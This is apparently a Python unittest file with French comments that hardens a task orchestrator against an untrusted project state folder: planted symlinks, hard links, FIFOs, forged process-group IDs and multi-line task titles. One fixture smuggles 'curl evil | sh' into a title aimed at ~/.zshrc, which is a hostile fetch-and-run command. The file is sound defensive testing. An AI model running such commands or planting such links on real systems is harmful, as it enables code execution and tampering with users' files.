"""Dossier de projet non fiable : son `.mini-orch/` ne doit jamais faire écrire ailleurs
(liens symboliques), ni faire tuer un processus que ce programme n'a pas lancé."""
import json
import os
import shutil
import stat
import tempfile
import threading
import unittest
from pathlib import Path

from orch import tasks as T
from orch.cli import build
from orch.config import Paths
from orch.fileio import UnsafePath, atomic_write_json, cleanup_tmp, read_json, secure_open
from orch.journal import Journal
from orch.lockfile import Lease, lock_for
from orch.store import Store, StoreError
from orch.workspace_root import validate_workspace


class TmpCase(unittest.TestCase):
    def setUp(self):
        self.base = Path(tempfile.mkdtemp(prefix="orch-untrusted-")).resolve()
        self.addCleanup(shutil.rmtree, self.base, True)
        self.root = self.base / "projet"
        self.root.mkdir()
        self.victim = self.base / "victime"
        self.victim.mkdir()
        self.paths = Paths.for_root(self.root)


class SymlinkTest(TmpCase):
    """Constat 1 : `.mini-orch/journal.log` → `~/.zshrc` + titre avec « \\n » = ligne exécutable."""

    def test_journal_never_appends_through_a_symlinked_log(self):
        rc = self.victim / ".zshrc"
        rc.write_text("# mon shell\n")
        self.paths.state.mkdir()
        os.symlink(str(rc), str(self.paths.journal))
        echoed = []
        Journal(self.paths, echoed.append)("[1] titre\ncurl evil | sh")
        self.assertEqual(rc.read_text(), "# mon shell\n")
        self.assertTrue(any("lien symbolique" in m for m in echoed), echoed)

    def test_journal_never_writes_into_a_symlinked_state_dir(self):
        os.symlink(str(self.victim), str(self.paths.state))
        Journal(self.paths, lambda m: None)("bonjour")
        self.assertEqual(list(self.victim.iterdir()), [])

    def test_state_lock_refuses_a_symlinked_lock_file(self):
        target = self.victim / "cible"
        self.paths.state.mkdir()
        os.symlink(str(target), str(self.paths.lock))
        with self.assertRaises(UnsafePath):
            with lock_for(self.paths.lock).held():
                pass
        self.assertFalse(target.exists())

    def test_lease_refuses_a_symlinked_run_file(self):
        target = self.victim / "cible"
        self.paths.runs.mkdir(parents=True)
        lease = self.paths.runs / "r1.lock"
        os.symlink(str(target), str(lease))
        with self.assertRaises(UnsafePath):
            Lease.acquire(lease)
        self.assertFalse(target.exists())

    def test_atomic_write_neither_writes_nor_chmods_through_a_symlinked_state_dir(self):
        os.chmod(str(self.victim), 0o755)
        os.symlink(str(self.victim), str(self.paths.state))
        with self.assertRaises(UnsafePath):
            atomic_write_json(self.paths.tasks, [])
        self.assertEqual(stat.S_IMODE(self.victim.stat().st_mode), 0o755)
        self.assertEqual(list(self.victim.iterdir()), [])

    def test_reading_a_symlinked_state_file_is_refused(self):
        secret = self.victim / "secret.json"
        secret.write_text('{"cle": "valeur"}')
        self.paths.state.mkdir()
        os.symlink(str(secret), str(self.paths.tasks))
        with self.assertRaises(UnsafePath):
            read_json(self.paths.tasks)
        with self.assertRaises(StoreError) as ctx:
            Store(self.paths, lambda m: None).snapshot()
        self.assertIn("lien symbolique", str(ctx.exception))
        self.assertNotIn(str(self.base), str(ctx.exception))  # jamais de chemin absolu

    def test_workspace_whose_state_dir_is_a_symlink_is_refused(self):
        os.symlink(str(self.victim), str(self.paths.state))
        path, err = validate_workspace(str(self.root))
        self.assertIsNone(path)
        self.assertIn("lien symbolique", err)

    def test_workspace_with_a_symlink_inside_its_state_dir_is_refused(self):
        # Ce programme ne crée jamais de lien dans .mini-orch : un lien = dossier piégé.
        for rel in ("chat.json", "runs/r1.lock"):
            with self.subTest(rel=rel):
                shutil.rmtree(str(self.paths.state), ignore_errors=True)
                planted = self.paths.state / rel
                planted.parent.mkdir(parents=True, exist_ok=True)
                os.symlink(str(self.victim / "x"), str(planted))
                path, err = validate_workspace(str(self.root))
                self.assertIsNone(path)
                self.assertIn("lien symbolique", err)
                self.assertIn(rel.split("/")[-1], err)

    def finishes(self, fn, seconds=5.0):
        """fn() rend la main (un FIFO bloquerait os.open pour toujours) : son résultat ou son erreur."""
        out = {}

        def run():
            try:
                out["value"] = fn()
            except Exception as e:  # noqa: BLE001 — rendu au test
                out["error"] = e
        th = threading.Thread(target=run, daemon=True)
        th.start()
        th.join(seconds)
        self.assertFalse(th.is_alive(), "bloqué : un FIFO planté a gelé l'ouverture")
        return out

    def test_a_planted_fifo_is_refused_instead_of_freezing(self):
        self.paths.state.mkdir()
        os.mkfifo(str(self.paths.tasks))
        out = self.finishes(lambda: read_json(self.paths.tasks))
        self.assertIsInstance(out.get("error"), UnsafePath)
        path, err = validate_workspace(str(self.root))
        self.assertIsNone(path)
        self.assertIn("tasks.json", err)

    def test_a_hard_link_to_a_user_file_is_never_appended_to(self):
        rc = self.victim / ".zshrc"
        rc.write_text("# mon shell\n")
        self.paths.state.mkdir()
        os.link(str(rc), str(self.paths.journal))
        Journal(self.paths, lambda m: None)("ligne")
        self.assertEqual(rc.read_text(), "# mon shell\n")
        with self.assertRaises(UnsafePath):
            os.close(secure_open(self.paths.journal, os.O_WRONLY | os.O_APPEND))

    def test_state_lock_through_a_link_is_a_store_error(self):
        # L'interface n'attrape que StoreError/LockTimeout : un lien planté ne doit pas la planter.
        self.paths.state.mkdir()
        os.symlink(str(self.victim / "cible"), str(self.paths.lock))
        with self.assertRaises(StoreError):
            Store(self.paths, lambda m: None).add_plan("G", [{"title": "t", "worker": "opencode"}])

    def test_page_reads_through_a_link_are_said_once_not_crashing(self):
        # Lien posé en cours de session (agent manipulé) : la page continue, le journal le dit.
        from orch.chat import ChatStore
        self.paths.state.mkdir()
        for name in ("reports.json", "chat.json"):
            os.symlink(str(self.victim / name), str(self.paths.state / name))
        logs = []
        store, chat = Store(self.paths, logs.append), ChatStore(self.paths, logs.append)
        for _ in range(3):
            self.assertEqual(store.reports(), [])
            self.assertEqual(chat.since(0), [])
        self.assertEqual(len(logs), 2, logs)

    def test_cleanup_never_deletes_through_a_symlinked_state_dir(self):
        left = self.victim / ".x.tmp"
        left.write_text("à moi")
        os.symlink(str(self.victim), str(self.paths.state))
        with self.assertRaises(UnsafePath):
            cleanup_tmp(self.paths.state)
        self.assertTrue(left.exists())

    def test_task_titles_are_kept_on_one_line(self):
        [t] = T.unpack([{"id": 1, "status": "todo", "title": "titre\nexport X=1\r\x1b[2J"}])
        self.assertNotIn("\n", t["title"])
        self.assertNotIn("\r", t["title"])
        self.assertNotIn("\x1b", t["title"])
        self.assertIn("export X=1", t["title"])


class OrphanTrustTest(TmpCase):
    """Constat 4 : un `owner.child_pgid` planté dans tasks.json ne doit rien faire tuer."""

    def setUp(self):
        super().setUp()
        self.settings = self.base / "logiciel" / ".mini-orch"
        self.paths = Paths.for_root(self.root, self.settings)
        self.killed, self.logs = [], []

    def killer(self, pgid, cmd):
        self.killed.append((pgid, cmd))
        return [f"worker orphelin {cmd} (groupe {pgid}) arrêté."]

    def store(self):
        return Store(self.paths, self.logs.append, orphan_killer=self.killer)

    def test_planted_child_pgid_is_never_killed(self):
        self.paths.state.mkdir()
        self.paths.tasks.write_text(json.dumps([{
            "id": 1, "title": "x", "status": "in_progress",
            "owner": {"pid": 999999, "run_id": "123456-abcd", "phase": "work",
                      "child_pgid": 4242, "child_cmd": "opencode"}}]))
        msgs = self.store().recover_stale()
        self.assertEqual(self.killed, [])
        self.assertTrue(any("laissé tel quel" in m for m in msgs), msgs)
        self.assertEqual(self.store().snapshot()[0]["status"], "blocked")  # la tâche, elle, est reprise

    def test_a_ledger_planted_in_the_project_is_not_trusted(self):
        self.paths.state.mkdir()
        self.paths.tasks.write_text(json.dumps([{
            "id": 1, "title": "x", "status": "in_progress",
            "owner": {"run_id": "123456-abcd", "phase": "work", "child_pgid": 4242, "child_cmd": "opencode"}}]))
        fake = {"children": {str(self.paths.root): {"123456-abcd": {"pgid": 4242, "cmd": "opencode"}}}}
        (self.paths.state / "trust.json").write_text(json.dumps(fake))
        self.store().recover_stale()
        self.assertEqual(self.killed, [])
        self.assertNotEqual(self.paths.trust.parent, self.paths.state)

    def test_child_launched_by_this_program_is_still_killed_after_a_crash(self):
        store = self.store()
        store.add_plan("G", [{"title": "t", "worker": "opencode", "detail": ""}])
        claim = store.checkout()
        store.set_child(claim.task["id"], claim.run_id, 4242, "opencode")
        claim.lease.release()  # le process propriétaire « meurt »
        self.store().recover_stale()
        self.assertEqual(self.killed, [(4242, "opencode")])

    def test_ledger_is_pruned_once_the_run_is_recovered(self):
        store = self.store()
        store.add_plan("G", [{"title": "t", "worker": "opencode", "detail": ""}])
        claim = store.checkout()
        store.set_child(claim.task["id"], claim.run_id, 4242, "opencode")
        claim.lease.release()
        self.store().recover_stale()
        ledger = json.loads(self.paths.trust.read_text())
        self.assertEqual(ledger.get("children", {}).get(str(self.paths.root), {}), {})


class ForeignStateTest(TmpCase):
    """Constat 4 : un `.mini-orch/` que ce programme n'a pas créé est signalé."""

    def setUp(self):
        super().setUp()
        self.settings = self.base / "logiciel" / ".mini-orch"
        self.echoed = []

    def open(self):
        self.echoed.clear()
        build(self.root, self.echoed.append, self.settings)

    def warned(self):
        return any("n'a pas été créé par ce programme" in m for m in self.echoed)

    def test_fresh_folder_is_not_flagged(self):
        self.open()
        self.assertFalse(self.warned(), self.echoed)
        self.open()
        self.assertFalse(self.warned(), self.echoed)

    def test_state_brought_with_the_project_is_flagged_while_its_tasks_are_pending(self):
        (self.root / ".mini-orch").mkdir()
        tasks = self.root / ".mini-orch" / "tasks.json"
        tasks.write_text(json.dumps([{"id": 1, "title": "piège", "status": "todo", "worker": "claude"}]))
        self.open()
        self.assertTrue(self.warned(), self.echoed)
        self.assertTrue(any("1 tâche" in m for m in self.echoed), self.echoed)
        self.open()  # toujours en attente : on le redit (pas d'adoption en douce)
        self.assertTrue(self.warned(), self.echoed)
        tasks.write_text(json.dumps([{"id": 1, "title": "piège", "status": "done", "worker": "claude"}]))
        self.open()  # plus rien en attente : signalé une dernière fois, puis suivi
        self.open()
        self.assertFalse(self.warned(), self.echoed)

    def test_marker_copied_from_another_mac_is_flagged(self):
        self.open()
        other = self.base / "autre-mac" / ".mini-orch"
        build(self.root, lambda m: None, other)  # un autre logiciel l'adopte : son marqueur remplace le nôtre
        self.open()  # ce logiciel : le marqueur a changé → plus le sien
        self.assertTrue(self.warned(), self.echoed)


if __name__ == "__main__":
    unittest.main()
